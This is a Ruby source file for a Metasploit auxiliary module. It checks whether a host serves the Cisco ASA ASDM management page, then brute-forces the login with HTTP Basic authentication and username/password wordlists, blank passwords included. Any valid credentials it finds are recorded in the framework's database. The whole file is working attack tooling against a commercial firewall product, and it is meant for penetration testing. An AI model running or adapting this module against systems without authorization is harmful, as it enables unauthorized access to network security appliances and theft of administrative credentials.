##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASA ASDM Brute-force Login',
        'Description' => %q{
          This module scans for the Cisco ASA ASDM landing page and performs login brute-force
          to identify valid credentials.
        },
        'Author' => [
          'jbaines-r7'
        ],
        'References' => [
          [ 'URL', 'https://www.cisco.com/c/en/us/products/security/adaptive-security-device-manager/index.html' ]
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true,
          'BLANK_PASSWORDS' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptPath.new('USERPASS_FILE', [
          false, 'File containing users and passwords separated by space, one pair per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')
        ]),
        OptPath.new('USER_FILE', [
          false, 'File containing users, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_users.txt')
        ]),
        OptPath.new('PASS_FILE', [
          false, 'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')
        ])
      ]
    )
  end

  def run_host(_ip)
    # Establish the remote host is running Cisco ASDM
    res = send_request_cgi('uri' => normalize_uri('/admin/public/index.html'))
    return unless res && res.code == 200 && res.body.include?('<title>Cisco ASDM ')

    print_status('The remote target appears to host Cisco ASA ASDM. The module will continue.')
    print_status('Starting login brute force...')

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'Cisco ASA ASDM',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Brute-force the login page
  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
    res = send_request_cgi({
      'uri' => normalize_uri('/admin/version.prop'),
      'agent' => 'ASDM/ Java/1.8.0_333',
      'authorization' => basic_auth(user, pass)
    })

    # check if the user was forwarded to the version.prop file
    if res && res.code == 200 && res.body.include?('asdm.version=') && res.body.include?('launcher.version=')

      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)

      return :next_user
    else
      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end
  end
end
